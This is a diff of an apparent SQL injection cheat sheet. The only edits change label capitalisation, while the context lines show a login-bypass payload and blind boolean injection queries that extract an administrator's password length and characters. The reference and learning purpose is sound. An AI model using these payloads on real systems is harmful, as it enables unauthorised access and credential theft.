@@ -64,7 +64,7 @@ conditions are used.
 <summary>LOGIN BYPASS TECHNIQUES</summary>
 <p><b>DESCRIPTION:</b> It is used to bypass login forms, guessing users or after collecting some of them.
 
-<u>Sample:</u>
+<u>SAMPLE:</u>
 	
 <b>C1: </b><p id="LBT01"><mark>administrator'--</mark></p> 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LBT01')">.C1.</button></p>
@@ -196,21 +196,21 @@ To successfully acomplish the blind attack, the boolean conditions can help. It 
 <u>check if column value exist ?</u>
 
 <b>C1: TRUE condition means column value exist ![guess or enumerate]</b><p id="BAT04"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='a</mark></p>
-<b>Sample: </b><mark>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</mark>
+<b>SAMPLE: </b><mark>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</mark>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT04')">.C1.</button> 
 
 <u>check the character lenght of the column ?</u>
 <b>C1: </b><p id="BAT06"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE' AND LENGTH(COLUMN_NAME)>1)='a</mark></p>
-<b>Sample: </b><mark>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</mark>
+<b>SAMPLE: </b><mark>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT06')">.C1.</button>
 
-<b>Note:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached 
+<b>NOTE:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached 
 hits the FALSE statement.
 
 > <u>check the characters of the column ?</u>
 <b>C1: </b><p id="BAT08"><mark>' AND (SELECT SUBSTRING(COLUMN_NAME,1,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='§a§</mark></p>
-<b>Sample: </b><mark>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</mark>
+<b>SAMPLE: </b><mark>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT08')">.C1.</button>
 
@@ -223,7 +223,7 @@ iterate more times with each letter, number, etc. For that reason a pre-req is t
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT10')">.C1.</button>
 
-<b>Note:</b> Remember the TRUE/FALSE logic and the response associated to that. That will help to know which 
+<b>NOTE:</b> Remember the TRUE/FALSE logic and the response associated to that. That will help to know which 
 values are correct = TRUE. 
 </details>
 <details>
